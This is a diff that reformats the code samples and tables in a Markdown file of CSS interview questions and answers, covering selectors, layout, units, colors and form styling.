@@ -473,10 +473,12 @@ There are three:
 3. **Inline styles**: a `style` attribute on an element.
 
 ```html
-<link rel="stylesheet" href="styles.css">
+<link rel="stylesheet" href="styles.css" />
 
 <style>
-  h1 { color: navy; }
+  h1 {
+    color: navy;
+  }
 </style>
 
 <p style="color: red;">Inline style</p>
@@ -528,7 +530,9 @@ It has zero specificity, so it doesn't make the rules that use it harder to over
 Separate the selectors with commas:
 
 ```css
-h1, h2, h3 {
+h1,
+h2,
+h3 {
   font-family: Georgia, serif;
 }
 ```
@@ -541,8 +545,12 @@ In a normal selector list, if one selector is invalid the whole rule is dropped.
 - `nav > a` is the **child combinator**. It only matches `a` elements that are direct children of `nav`.
 
 ```css
-ul li { color: gray; }   /* every li inside the ul, including nested lists */
-ul > li { color: black; } /* only the top-level li elements */
+ul li {
+  color: gray;
+} /* every li inside the ul, including nested lists */
+ul > li {
+  color: black;
+} /* only the top-level li elements */
 ```
 
 ### 9: What is the difference between `+` and `~` combinators?
@@ -557,12 +565,24 @@ Both only look forward. To style an element based on something that comes after 
 They match elements based on their attributes and attribute values.
 
 ```css
-[disabled] { opacity: 0.5; }                /* has the attribute */
-[type="email"] { border-color: blue; }      /* exact value */
-a[href^="https"] { color: green; }          /* starts with */
-a[href$=".pdf"]::after { content: " (PDF)"; } /* ends with */
-[class*="icon-"] { display: inline-block; }  /* contains */
-[lang|="en"] { quotes: "\201C" "\201D"; }    /* "en" or starts with "en-" */
+[disabled] {
+  opacity: 0.5;
+} /* has the attribute */
+[type="email"] {
+  border-color: blue;
+} /* exact value */
+a[href^="https"] {
+  color: green;
+} /* starts with */
+a[href$=".pdf"]::after {
+  content: " (PDF)";
+} /* ends with */
+[class*="icon-"] {
+  display: inline-block;
+} /* contains */
+[lang|="en"] {
+  quotes: "\201C" "\201D";
+} /* "en" or starts with "en-" */
 ```
 
 Add ` i` before the closing bracket to make the value match case-insensitive: `[type="EMAIL" i]`.
@@ -572,10 +592,18 @@ Add ` i` before the closing bracket to make the value match case-insensitive: `[
 A pseudo-class selects an element based on its state or position, not on its tag, class or id. It starts with a single colon.
 
 ```css
-a:hover { text-decoration: underline; }
-input:focus { outline: 2px solid blue; }
-li:first-child { font-weight: bold; }
-input:disabled { background: #eee; }
+a:hover {
+  text-decoration: underline;
+}
+input:focus {
+  outline: 2px solid blue;
+}
+li:first-child {
+  font-weight: bold;
+}
+input:disabled {
+  background: #eee;
+}
 ```
 
 ### 12: What is a pseudo-element?
@@ -583,9 +611,16 @@ input:disabled { background: #eee; }
 A pseudo-element styles part of an element, or adds generated content that isn't in the HTML. It uses two colons.
 
 ```css
-p::first-line { font-weight: bold; }
-.required::after { content: " *"; color: red; }
-::selection { background: yellow; }
+p::first-line {
+  font-weight: bold;
+}
+.required::after {
+  content: " *";
+  color: red;
+}
+::selection {
+  background: yellow;
+}
 ```
 
 `::before` and `::after` are the most common ones. They don't show up unless you set `content`.
@@ -631,7 +666,9 @@ ul li a::before   /* (0,0,4) */
 `!important` makes a declaration win over normal declarations, no matter the specificity. It's hard to override. You need another `!important` with a higher priority, which leads to `!important` wars.
 
 ```css
-.hidden { display: none !important; }
+.hidden {
+  display: none !important;
+}
 ```
 
 Fair uses are utility classes that must always apply, and overriding inline styles from a third-party script you can't change. Don't use it to fix specificity problems you created yourself.
@@ -710,8 +747,12 @@ Padding is space inside the element, between its content and its border. Margin 
 When two vertical margins of block elements touch, they merge into one margin, and its size is the larger of the two. They aren't added together.
 
 ```css
-h2 { margin-bottom: 30px; }
-p  { margin-top: 20px; }
+h2 {
+  margin-bottom: 30px;
+}
+p {
+  margin-top: 20px;
+}
 /* the gap between them is 30px, not 50px */
 ```
 
@@ -722,9 +763,9 @@ This also happens between a parent and its first or last child, if no border, pa
 They go clockwise from the top:
 
 ```css
-margin: 10px;                /* all four sides */
-margin: 10px 20px;           /* top/bottom, left/right */
-margin: 10px 20px 30px;      /* top, left/right, bottom */
+margin: 10px; /* all four sides */
+margin: 10px 20px; /* top/bottom, left/right */
+margin: 10px 20px 30px; /* top, left/right, bottom */
 margin: 10px 20px 30px 40px; /* top, right, bottom, left */
 ```
 
@@ -738,11 +779,11 @@ To remember the order, think of the word "TRouBLe" (Top, Right, Bottom, Left).
 
 ### 27: What is the difference between `display: none`, `visibility: hidden` and `opacity: 0`?
 
-| | Takes up space | Can be clicked | Read by screen readers |
-|---|---|---|---|
-| `display: none` | No | No | No |
-| `visibility: hidden` | Yes | No | No |
-| `opacity: 0` | Yes | Yes | Yes |
+|                      | Takes up space | Can be clicked | Read by screen readers |
+| -------------------- | -------------- | -------------- | ---------------------- |
+| `display: none`      | No             | No             | No                     |
+| `visibility: hidden` | Yes            | No             | No                     |
+| `opacity: 0`         | Yes            | Yes            | Yes                    |
 
 `opacity` and `visibility` can be animated. Since 2024 you can also animate to and from `display: none` with `transition-behavior: allow-discrete` and `@starting-style`.
 
@@ -755,8 +796,14 @@ It's the default for every element. The element sits in the normal document flow
 The element stays in the normal flow, but you can move it with `top`, `left` and the other offsets. Its original space is kept, so other elements don't move. It's mostly used to make the element the reference point for absolutely positioned children.
 
 ```css
-.card { position: relative; }
-.badge { position: absolute; top: 8px; right: 8px; }
+.card {
+  position: relative;
+}
+.badge {
+  position: absolute;
+  top: 8px;
+  right: 8px;
+}
 ```
 
 ### 30: What does `position: absolute` do?
@@ -799,8 +846,13 @@ Use DevTools (the Layers panel in Chrome, or the 3D View in Edge) to see which s
 `float: left` or `float: right` moves an element to one side and lets text and inline content wrap around it. `clear` stops an element from sitting next to floats that come before it.
 
 ```css
-img.avatar { float: left; margin-right: 1rem; }
-.footer { clear: both; }
+img.avatar {
+  float: left;
+  margin-right: 1rem;
+}
+.footer {
+  clear: both;
+}
 ```
 
 Floats were used for page layout for years. Today that job belongs to flexbox and grid. Use floats for what they were made for: wrapping text around an image.
@@ -820,7 +872,9 @@ A parent that only has floated children collapses to zero height, because floats
 The modern way is `display: flow-root` on the parent. It creates a new block formatting context, so the parent contains its floats with no hack.
 
 ```css
-.container { display: flow-root; }
+.container {
+  display: flow-root;
+}
 ```
 
 ### 37: What are the values of `overflow`?
@@ -842,9 +896,15 @@ You can set each axis on its own with `overflow-x` and `overflow-y`.
 - `rem` is relative to the root (`html`) font size, which is usually 16px.
 
 ```css
-html { font-size: 100%; }  /* usually 16px */
-h1 { font-size: 2rem; }    /* 32px */
-.btn { padding: 0.5em 1em; } /* scales with the button's own font size */
+html {
+  font-size: 100%;
+} /* usually 16px */
+h1 {
+  font-size: 2rem;
+} /* 32px */
+.btn {
+  padding: 0.5em 1em;
+} /* scales with the button's own font size */
 ```
 
 Use `rem` for font sizes so they respect the user's browser settings. `em` is handy for spacing that should grow with the text, like button padding.
@@ -864,8 +924,12 @@ It depends on the property:
 `1vw` is 1% of the viewport width and `1vh` is 1% of the viewport height. `vmin` and `vmax` use whichever side is smaller or larger.
 
 ```css
-.hero { height: 100vh; }
-h1 { font-size: 5vw; }
+.hero {
+  height: 100vh;
+}
+h1 {
+  font-size: 5vw;
+}
 ```
 
 On mobile, `100vh` is often taller than the area you can actually see, because the browser's address bar shows and hides as you scroll. The newer `dvh`, `svh` and `lvh` units were added to fix this.
@@ -891,18 +955,20 @@ They are viewport units that know about mobile browser toolbars:
 `ch` is the width of the "0" character in the current font. `ex` is the x-height (the height of a lowercase "x"). `ch` is a common way to limit line length so text is easy to read:
 
 ```css
-article { max-width: 65ch; }
+article {
+  max-width: 65ch;
+}
 ```
 
 ### 43: What color formats does CSS support?
 
 ```css
-color: tomato;                    /* named color */
-color: #ff6347;                   /* hex */
-color: #f63;                      /* short hex */
-color: rgb(255 99 71);            /* rgb */
-color: hsl(9 100% 64%);           /* hue, saturation, lightness */
-color: oklch(70% 0.19 35);        /* lightness, chroma, hue */
+color: tomato; /* named color */
+color: #ff6347; /* hex */
+color: #f63; /* short hex */
+color: rgb(255 99 71); /* rgb */
+color: hsl(9 100% 64%); /* hue, saturation, lightness */
+color: oklch(70% 0.19 35); /* lightness, chroma, hue */
 color: color(display-p3 1 0.4 0.3); /* wide gamut */
 ```
 
@@ -915,7 +981,7 @@ Add an alpha value. Modern syntax uses spaces and a slash. The older comma synta
 ```css
 background: rgb(0 0 0 / 50%);
 background: hsl(220 90% 50% / 0.3);
-background: #00000080;          /* 8-digit hex, last two digits are alpha */
+background: #00000080; /* 8-digit hex, last two digits are alpha */
 background: rgba(0, 0, 0, 0.5); /* older syntax */
 ```
 
@@ -928,7 +994,9 @@ background: rgba(0, 0, 0, 0.5); /* older syntax */
   color: purple;
   border: 2px solid currentColor;
 }
-.icon { fill: currentColor; }
+.icon {
+  fill: currentColor;
+}
 ```
 
 ### 46: What is the difference between `opacity` and an alpha color?
@@ -936,8 +1004,12 @@ background: rgba(0, 0, 0, 0.5); /* older syntax */
 `opacity` makes the whole element see-through, including its text and all its children. An alpha color only affects the property it's used on.
 
 ```css
-.overlay { opacity: 0.5; }                  /* text gets faded too */
-.overlay { background: rgb(0 0 0 / 50%); }  /* only the background is faded */
+.overlay {
+  opacity: 0.5;
+} /* text gets faded too */
+.overlay {
+  background: rgb(0 0 0 / 50%);
+} /* only the background is faded */
 ```
 
 An `opacity` below 1 also creates a new stacking context.
@@ -959,7 +1031,7 @@ Generic families include `serif`, `sans-serif`, `monospace`, `cursive`, `system-
 ```css
 p {
   font-size: 1rem;
-  font-weight: 400;     /* normal; 700 is bold */
+  font-weight: 400; /* normal; 700 is bold */
   font-style: italic;
 }
 ```
@@ -971,17 +1043,21 @@ There is also a `font` shorthand: `font: italic 700 1rem/1.5 system-ui, sans-ser
 A unitless value like `1.5` is passed down to children as a multiplier, so each child works out its own line height from its own font size. With a unit like `24px` or `1.5em`, children inherit the final computed number, which may be too small for larger headings.
 
 ```css
-body { line-height: 1.5; } /* good */
-body { line-height: 1.5em; } /* children get a fixed px value */
+body {
+  line-height: 1.5;
+} /* good */
+body {
+  line-height: 1.5em;
+} /* children get a fixed px value */
 ```
 
 ### 50: Which properties are used to style text?
 
 ```css
 h1 {
-  text-align: center;          /* left, right, center, justify, start, end */
-  text-decoration: underline;  /* none, underline, line-through */
-  text-transform: uppercase;   /* lowercase, capitalize */
+  text-align: center; /* left, right, center, justify, start, end */
+  text-decoration: underline; /* none, underline, line-through */
+  text-transform: uppercase; /* lowercase, capitalize */
   text-indent: 2em;
 }
 ```
@@ -1040,7 +1116,9 @@ This only works for one line. For several lines, use `line-clamp`.
   font-display: swap;
 }
 
-body { font-family: "Inter", sans-serif; }
+body {
+  font-family: "Inter", sans-serif;
+}
 ```
 
 WOFF2 is the format to use today. It's compressed and every modern browser supports it.
@@ -1051,7 +1129,12 @@ It's a `font-family` list that uses the operating system's own UI font, so nothi
 
 ```css
 body {
-  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  font-family:
+    system-ui,
+    -apple-system,
+    "Segoe UI",
+    Roboto,
+    sans-serif;
 }
 ```
 
@@ -1067,7 +1150,7 @@ Text shows up instantly with no layout shift. The trade-off is that the font loo
   background-position: center;
   background-size: cover;
   background-attachment: scroll; /* or fixed, local */
-  background-clip: border-box;   /* or padding-box, content-box, text */
+  background-clip: border-box; /* or padding-box, content-box, text */
 }
 ```
 
@@ -1099,19 +1182,29 @@ Both keep the image's aspect ratio.
 Gradients are images, so they go in `background-image`.
 
 ```css
-.a { background: linear-gradient(to right, #4f46e5, #ec4899); }
-.b { background: linear-gradient(45deg, red 0%, orange 50%, yellow 100%); }
-.c { background: radial-gradient(circle at top left, white, steelblue); }
-.d { background: conic-gradient(red, yellow, green, red); }
-.e { background: repeating-linear-gradient(45deg, #000 0 10px, #fff 10px 20px); }
+.a {
+  background: linear-gradient(to right, #4f46e5, #ec4899);
+}
+.b {
+  background: linear-gradient(45deg, red 0%, orange 50%, yellow 100%);
+}
+.c {
+  background: radial-gradient(circle at top left, white, steelblue);
+}
+.d {
+  background: conic-gradient(red, yellow, green, red);
+}
+.e {
+  background: repeating-linear-gradient(45deg, #000 0 10px, #fff 10px 20px);
+}
 ```
 
 ### 60: How do `border` and `border-radius` work?
 
 ```css
 .card {
-  border: 1px solid #ddd;   /* width, style, color */
-  border-radius: 8px;       /* rounded corners */
+  border: 1px solid #ddd; /* width, style, color */
+  border-radius: 8px; /* rounded corners */
 }
 .tab {
   border-radius: 8px 8px 0 0; /* top-left, top-right, bottom-right, bottom-left */
@@ -1204,7 +1297,9 @@ Give it a width (or `max-width`) and set its left and right margins to `auto`.
 `text-align: center` centers inline content, like text, images and inline-blocks, inside a block. It doesn't center the block itself.
 
 ```css
-.hero { text-align: center; }
+.hero {
+  text-align: center;
+}
 ```
 
 ### 69: What is Flexbox?
@@ -1287,8 +1382,12 @@ By default (`nowrap`), flex items stay on one line and shrink to fit. `flex-wrap
 `flex` is a shorthand for `flex-grow`, `flex-shrink` and `flex-basis`. `flex: 1` means `flex: 1 1 0%`: the item can grow and shrink, and it starts from a size of zero. So all items with `flex: 1` end up the same size.
 
 ```css
-.sidebar { flex: 0 0 250px; } /* fixed 250px, no growing or shrinking */
-.content { flex: 1; }         /* takes the rest */
+.sidebar {
+  flex: 0 0 250px;
+} /* fixed 250px, no growing or shrinking */
+.content {
+  flex: 1;
+} /* takes the rest */
 ```
 
 Other common values: `flex: auto` is `1 1 auto` and `flex: none` is `0 0 auto`.
@@ -1298,7 +1397,9 @@ Other common values: `flex: auto` is `1 1 auto` and `flex: none` is `0 0 auto`.
 It changes the visual order of flex or grid items. Items with lower values come first, and the default is 0.
 
 ```css
-.featured { order: -1; } /* moves to the front */
+.featured {
+  order: -1;
+} /* moves to the front */
 ```
 
 It only changes what you see, not the tab order or what screen readers read. Use it carefully, or keyboard users will jump around the page in a confusing way.
@@ -1308,8 +1409,13 @@ It only changes what you see, not the tab order or what screen readers read. Use
 It overrides `align-items` for one item.
 
 ```css
-.container { display: flex; align-items: flex-start; }
-.special { align-self: center; }
+.container {
+  display: flex;
+  align-items: flex-start;
+}
+.special {
+  align-self: center;
+}
 ```
 
 ### 79: How do you center an element both ways with Flexbox?
@@ -1366,9 +1472,15 @@ The last line is a responsive grid with no media queries. It fits as many 200px-
 Use `grid-column` and `grid-row` with line numbers or `span`.
 
 ```css
-.hero { grid-column: 1 / -1; }   /* from the first line to the last line */
-.wide { grid-column: span 2; }   /* two columns wide */
-.tall { grid-row: 2 / 4; }       /* from row line 2 to row line 4 */
+.hero {
+  grid-column: 1 / -1;
+} /* from the first line to the last line */
+.wide {
+  grid-column: span 2;
+} /* two columns wide */
+.tall {
+  grid-row: 2 / 4;
+} /* from row line 2 to row line 4 */
 ```
 
 Negative numbers count from the end, but only for lines of the explicit grid.
@@ -1386,10 +1498,18 @@ It lets you name areas of the grid and draw the layout with text.
     "sidebar main"
     "footer footer";
 }
-.header  { grid-area: header; }
-.sidebar { grid-area: sidebar; }
-.main    { grid-area: main; }
-.footer  { grid-area: footer; }
+.header {
+  grid-area: header;
+}
+.sidebar {
+  grid-area: sidebar;
+}
+.main {
+  grid-area: main;
+}
+.footer {
+  grid-area: footer;
+}
 ```
 
 Each area has to be a rectangle. A `.` marks an empty cell.
@@ -1417,14 +1537,21 @@ They work well together. It's common to use grid for the page and flexbox inside
 Media queries apply styles only when a condition is true, usually about the viewport size or a user setting.
 
 ```css
-.grid { grid-template-columns: 1fr; }
-
-@media (min-width: 768px) {
-  .grid { grid-template-columns: repeat(2, 1fr); }
+.grid {
+  grid-template-columns: 1fr;
 }
 
-@media (width >= 1024px) {   /* newer range syntax */
-  .grid { grid-template-columns: repeat(3, 1fr); }
+@media (min-width: 768px) {
+  .grid {
+    grid-template-columns: repeat(2, 1fr);
+  }
+}
+
+@media (width >= 1024px) {
+  /* newer range syntax */
+  .grid {
+    grid-template-columns: repeat(3, 1fr);
+  }
 }
 ```
 
@@ -1437,7 +1564,7 @@ You write the base styles for small screens first, then add `min-width` media qu
 Without it, mobile browsers pretend the screen is about 980px wide and zoom the page out, and your media queries don't fire as you'd expect.
 
 ```html
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
 ```
 
 This tag is HTML, but responsive CSS doesn't work properly on phones without it.
@@ -1487,10 +1614,18 @@ Timing functions include `ease` (default), `linear`, `ease-in`, `ease-out`, `eas
 It moves, rotates, scales or skews an element visually without affecting the layout around it.
 
 ```css
-.a { transform: translate(10px, 20px); }
-.b { transform: rotate(45deg); }
-.c { transform: scale(1.1); }
-.d { transform: translateX(-50%) rotate(10deg); }
+.a {
+  transform: translate(10px, 20px);
+}
+.b {
+  transform: rotate(45deg);
+}
+.c {
+  transform: scale(1.1);
+}
+.d {
+  transform: translateX(-50%) rotate(10deg);
+}
 ```
 
 There are also separate properties for each one: `translate`, `rotate` and `scale`.
@@ -1501,8 +1636,14 @@ Define the steps with `@keyframes`, then apply them with `animation`.
 
 ```css
 @keyframes fade-in {
-  from { opacity: 0; transform: translateY(10px); }
-  to   { opacity: 1; transform: translateY(0); }
+  from {
+    opacity: 0;
+    transform: translateY(10px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
 }
 
 .toast {
@@ -1521,13 +1662,15 @@ You can use percentages for more steps: `0%`, `50%`, `100%`.
   animation-timing-function: linear;
   animation-delay: 0s;
   animation-iteration-count: infinite;
-  animation-direction: normal;   /* reverse, alternate, alternate-reverse */
-  animation-fill-mode: none;     /* forwards, backwards, both */
+  animation-direction: normal; /* reverse, alternate, alternate-reverse */
+  animation-fill-mode: none; /* forwards, backwards, both */
   animation-play-state: running; /* paused */
 }
 
 /* shorthand */
-.spinner { animation: spin 1s linear infinite; }
+.spinner {
+  animation: spin 1s linear infinite;
+}
 ```
 
 ### 96: What is the difference between `:hover`, `:focus` and `:active`?
@@ -1552,13 +1695,27 @@ button:focus-visible {
 ### 98: How do `:first-child`, `:last-child` and `:nth-child()` work?
 
 ```css
-li:first-child { font-weight: bold; }
-li:last-child  { border-bottom: none; }
-li:nth-child(2) { color: red; }          /* the 2nd one */
-tr:nth-child(odd) { background: #f5f5f5; } /* 1st, 3rd, 5th... */
-li:nth-child(3n) { color: blue; }        /* every 3rd one */
-li:nth-child(n + 4) { opacity: 0.5; }    /* 4th and after */
-li:nth-last-child(-n + 2) { color: gray; } /* the last two */
+li:first-child {
+  font-weight: bold;
+}
+li:last-child {
+  border-bottom: none;
+}
+li:nth-child(2) {
+  color: red;
+} /* the 2nd one */
+tr:nth-child(odd) {
+  background: #f5f5f5;
+} /* 1st, 3rd, 5th... */
+li:nth-child(3n) {
+  color: blue;
+} /* every 3rd one */
+li:nth-child(n + 4) {
+  opacity: 0.5;
+} /* 4th and after */
+li:nth-last-child(-n + 2) {
+  color: gray;
+} /* the last two */
 ```
 
 They count from 1, not 0. They count all sibling elements, whatever their type.
@@ -1582,8 +1739,12 @@ They count from 1, not 0. They count all sibling elements, whatever their type.
 It matches elements that don't match the selector inside it. It accepts a list of selectors.
 
 ```css
-li:not(:last-child) { border-bottom: 1px solid #ddd; }
-button:not(.primary, .danger) { background: gray; }
+li:not(:last-child) {
+  border-bottom: 1px solid #ddd;
+}
+button:not(.primary, .danger) {
+  background: gray;
+}
 ```
 
 Its specificity is the specificity of the most specific selector inside it.
@@ -1614,8 +1775,13 @@ They don't work on replaced elements like `<img>` and `<input>`, because those c
 - `::selection` styles the text the user has highlighted.
 
 ```css
-input::placeholder { color: #999; }
-::selection { background: #ffe066; color: #000; }
+input::placeholder {
+  color: #999;
+}
+::selection {
+  background: #ffe066;
+  color: #000;
+}
 ```
 
 `::selection` only supports a few properties, such as `color`, `background-color`, `text-decoration` and `text-shadow`.
@@ -1670,9 +1836,15 @@ The fallback is used when the variable isn't defined. It isn't used when the var
 `calc()` does math with values, and it can mix units.
 
 ```css
-.sidebar { width: calc(100% - 250px); }
-.title { font-size: calc(1rem + 1vw); }
-.item { margin: calc(var(--space) * 2); }
+.sidebar {
+  width: calc(100% - 250px);
+}
+.title {
+  font-size: calc(1rem + 1vw);
+}
+.item {
+  margin: calc(var(--space) * 2);
+}
 ```
 
 You need spaces around `+` and `-`. `calc(100%-10px)` is invalid.
@@ -1684,9 +1856,15 @@ You need spaces around `+` and `-`. `calc(100%-10px)` is invalid.
 - `clamp(min, preferred, max)` uses the preferred value but keeps it between the two limits.
 
 ```css
-.container { width: min(100% - 2rem, 1200px); }
-h1 { font-size: clamp(1.75rem, 4vw + 1rem, 3rem); }
-.button { padding-inline: max(1rem, 2vw); }
+.container {
+  width: min(100% - 2rem, 1200px);
+}
+h1 {
+  font-size: clamp(1.75rem, 4vw + 1rem, 3rem);
+}
+.button {
+  padding-inline: max(1rem, 2vw);
+}
 ```
 
 You can do math inside them without writing `calc()`.
@@ -1697,7 +1875,9 @@ Only with `/* ... */`. They can span several lines. `//` is not a comment in pla
 
 ```css
 /* Main navigation */
-.nav { display: flex; }
+.nav {
+  display: flex;
+}
 ```
 
 ### 109: What is the difference between a CSS reset and Normalize.css?
@@ -1719,9 +1899,15 @@ ul.clean {
   margin: 0;
   padding: 0;
 }
-ol.roman { list-style-type: upper-roman; }
-ul.check { list-style-image: url("check.svg"); }
-li::marker { color: tomato; }
+ol.roman {
+  list-style-type: upper-roman;
+}
+ul.check {
+  list-style-image: url("check.svg");
+}
+li::marker {
+  color: tomato;
+}
 ```
 
 Safari doesn't announce lists to VoiceOver as lists when you remove `list-style`. If that matters, add `role="list"` to the `ul`.
@@ -1731,10 +1917,18 @@ Safari doesn't announce lists to VoiceOver as lists when you remove `list-style`
 Use the "LoVe HAte" order: `:link`, `:visited`, `:hover`, `:active`. These selectors all have the same specificity, so the later one wins. If `:hover` came before `:visited`, visited links wouldn't change on hover.
 
 ```css
-a:link    { color: blue; }
-a:visited { color: purple; }
-a:hover   { color: darkblue; }
-a:active  { color: red; }
+a:link {
+  color: blue;
+}
+a:visited {
+  color: purple;
+}
+a:hover {
+  color: darkblue;
+}
+a:active {
+  color: red;
+}
 ```
 
 Add `:focus-visible` next to `:hover` for keyboard users.
@@ -1744,10 +1938,18 @@ Add `:focus-visible` next to `:hover` for keyboard users.
 It changes the mouse pointer shown over an element.
 
 ```css
-button { cursor: pointer; }
-.disabled { cursor: not-allowed; }
-.draggable { cursor: grab; }
-.resizer { cursor: col-resize; }
+button {
+  cursor: pointer;
+}
+.disabled {
+  cursor: not-allowed;
+}
+.draggable {
+  cursor: grab;
+}
+.resizer {
+  cursor: col-resize;
+}
 ```
 
 ### 114: What does `object-fit` do?
@@ -1758,7 +1960,7 @@ It controls how an `<img>` or `<video>` fills its box when the box has a differe
 .thumb {
   width: 200px;
   height: 200px;
-  object-fit: cover;          /* fill and crop */
+  object-fit: cover; /* fill and crop */
   object-position: top center; /* which part to keep */
 }
 ```
@@ -1770,8 +1972,13 @@ The values are `fill` (default, stretches), `contain`, `cover`, `none` and `scal
 It keeps an element at a set width-to-height ratio.
 
 ```css
-.video { width: 100%; aspect-ratio: 16 / 9; }
-.square { aspect-ratio: 1; }
+.video {
+  width: 100%;
+  aspect-ratio: 16 / 9;
+}
+.square {
+  aspect-ratio: 1;
+}
 ```
 
 Before this property existed, people used the "padding-top: 56.25%" hack. Browsers also use the `width` and `height` attributes on `<img>` to set an aspect ratio before the image loads, which stops layout from jumping.
@@ -1781,8 +1988,12 @@ Before this property existed, people used the "padding-top: 56.25%" hack. Browse
 It aligns inline, inline-block and table-cell elements vertically. It does nothing on block elements or flex items.
 
 ```css
-img.icon { vertical-align: middle; }
-td { vertical-align: top; }
+img.icon {
+  vertical-align: middle;
+}
+td {
+  vertical-align: top;
+}
 ```
 
 Common values: `baseline` (default), `middle`, `top`, `bottom`, `text-top`, `text-bottom`, or a length.
@@ -1792,7 +2003,9 @@ Common values: `baseline` (default), `middle`, `top`, `bottom`, `text-top`, `tex
 The element stops reacting to the mouse and touch. Clicks go through it to whatever is underneath. It's useful for decorative overlays.
 
 ```css
-.overlay-decoration { pointer-events: none; }
+.overlay-decoration {
+  pointer-events: none;
+}
 ```
 
 It doesn't stop keyboard focus. A button with `pointer-events: none` can still be reached with Tab and pressed with Enter. To really disable something, use the `disabled` attribute or `inert`.
@@ -1818,13 +2031,18 @@ table {
   border-collapse: collapse; /* single borders between cells */
   width: 100%;
 }
-th, td {
+th,
+td {
   border: 1px solid #ddd;
   padding: 0.5rem 0.75rem;
   text-align: left;
 }
-tbody tr:nth-child(even) { background: #f9f9f9; }
-caption { caption-side: bottom; }
+tbody tr:nth-child(even) {
+  background: #f9f9f9;
+}
+caption {
+  caption-side: bottom;
+}
 ```
 
 With `border-collapse: separate` (the default), each cell has its own borders, and `border-spacing` sets the gap between them.
@@ -1914,15 +2132,18 @@ Setting `html { font-size: 62.5%; }` makes `1rem` equal 10px, which makes the ma
 
 Logical properties describe sides by text direction instead of by screen direction. They switch automatically for right-to-left languages and vertical writing.
 
-| Physical | Logical |
-|---|---|
+| Physical                       | Logical                                     |
+| ------------------------------ | ------------------------------------------- |
 | `margin-left` / `margin-right` | `margin-inline-start` / `margin-inline-end` |
-| `margin-top` / `margin-bottom` | `margin-block-start` / `margin-block-end` |
-| `width` / `height` | `inline-size` / `block-size` |
-| `text-align: left` | `text-align: start` |
+| `margin-top` / `margin-bottom` | `margin-block-start` / `margin-block-end`   |
+| `width` / `height`             | `inline-size` / `block-size`                |
+| `text-align: left`             | `text-align: start`                         |
 
 ```css
-.card { padding-inline: 1rem; margin-block: 2rem; }
+.card {
+  padding-inline: 1rem;
+  margin-block: 2rem;
+}
 ```
 
 ### 131: How do you detect dark mode in CSS?
@@ -1940,7 +2161,10 @@ Use the `prefers-color-scheme` media feature.
     --text: #eee;
   }
 }
-body { background: var(--bg); color: var(--text); }
+body {
+  background: var(--bg);
+  color: var(--text);
+}
 ```
 
 Also set `color-scheme: light dark;` on `:root`, so scrollbars and form controls switch too.
@@ -1970,10 +2194,21 @@ Use `@media print`, or a stylesheet with `media="print"`.
 
 ```css
 @media print {
-  nav, .ads, button { display: none; }
-  body { color: black; background: white; }
-  a[href]::after { content: " (" attr(href) ")"; }
-  h2 { break-after: avoid; }
+  nav,
+  .ads,
+  button {
+    display: none;
+  }
+  body {
+    color: black;
+    background: white;
+  }
+  a[href]::after {
+    content: " (" attr(href) ")";
+  }
+  h2 {
+    break-after: avoid;
+  }
 }
 ```
 
@@ -1984,9 +2219,17 @@ You can test it in DevTools by emulating print media in the Rendering panel.
 A sprite is one image file that holds many small icons. Each icon is shown with `background-position`. It was used to cut down HTTP requests in the HTTP/1.1 days.
 
 ```css
-.icon { background: url("sprite.png") no-repeat; width: 16px; height: 16px; }
-.icon-home { background-position: 0 0; }
-.icon-user { background-position: -16px 0; }
+.icon {
+  background: url("sprite.png") no-repeat;
+  width: 16px;
+  height: 16px;
+}
+.icon-home {
+  background-position: 0 0;
+}
+.icon-user {
+  background-position: -16px 0;
+}
 ```
 
 Today it's mostly legacy. People use inline SVG, SVG sprites with `<use>`, or icon components, and HTTP/2 makes many small requests cheap.
@@ -1996,8 +2239,13 @@ Today it's mostly legacy. People use inline SVG, SVG sprites with `<use>`, or ic
 It lets the user resize an element by dragging its corner. It only works when `overflow` is not `visible`.
 
 ```css
-textarea { resize: vertical; }   /* none, both, horizontal, vertical */
-.panel { overflow: auto; resize: both; }
+textarea {
+  resize: vertical;
+} /* none, both, horizontal, vertical */
+.panel {
+  overflow: auto;
+  resize: both;
+}
 ```
 
 ### 136: What does `scroll-behavior: smooth` do?
@@ -2005,10 +2253,14 @@ textarea { resize: vertical; }   /* none, both, horizontal, vertical */
 It makes the page scroll smoothly instead of jumping when you click an anchor link or call `scrollTo()` from JavaScript.
 
 ```css
-html { scroll-behavior: smooth; }
+html {
+  scroll-behavior: smooth;
+}
 
 @media (prefers-reduced-motion: reduce) {
-  html { scroll-behavior: auto; }
+  html {
+    scroll-behavior: auto;
+  }
 }
 ```
 
@@ -2017,7 +2269,9 @@ html { scroll-behavior: smooth; }
 It sets the main color of built-in form controls like checkboxes, radio buttons, range sliders and progress bars, with no custom markup.
 
 ```css
-:root { accent-color: #4f46e5; }
+:root {
+  accent-color: #4f46e5;
+}
 ```
 
 The browser picks a check mark color that has enough contrast with your accent.
@@ -2025,13 +2279,27 @@ The browser picks a check mark color that has enough contrast with your accent.
 ### 138: Which pseudo-classes help style form states?
 
 ```css
-input:checked + label { font-weight: bold; }
-input:disabled { opacity: 0.5; }
-input:enabled { background: white; }
-input:required { border-left: 3px solid orange; }
-input:optional { border-left: none; }
-input:read-only { background: #f3f3f3; }
-input:indeterminate { outline: 2px dashed gray; }
+input:checked + label {
+  font-weight: bold;
+}
+input:disabled {
+  opacity: 0.5;
+}
+input:enabled {
+  background: white;
+}
+input:required {
+  border-left: 3px solid orange;
+}
+input:optional {
+  border-left: none;
+}
+input:read-only {
+  background: #f3f3f3;
+}
+input:indeterminate {
+  outline: 2px dashed gray;
+}
 ```
 
 `:indeterminate` matches a checkbox whose `indeterminate` property was set by JavaScript. It also matches a radio group with nothing selected.
@@ -2041,8 +2309,12 @@ input:indeterminate { outline: 2px dashed gray; }
 `:invalid` matches as soon as the field fails validation, even before the user types anything, so a required field shows red on page load. `:user-invalid` only matches after the user has interacted with the field (or tried to submit the form), which is what you usually want.
 
 ```css
-input:user-invalid { border-color: crimson; }
-input:user-valid { border-color: seagreen; }
+input:user-invalid {
+  border-color: crimson;
+}
+input:user-valid {
+  border-color: seagreen;
+}
 ```
 
 ### 140: What is `::marker`?
@@ -2054,7 +2326,9 @@ li::marker {
   color: #4f46e5;
   font-weight: bold;
 }
-ol li::marker { content: counter(list-item) ") "; }
+ol li::marker {
+  content: counter(list-item) ") ";
+}
 ```
 
 Only a few properties work on it, like `color`, `content` and font properties.
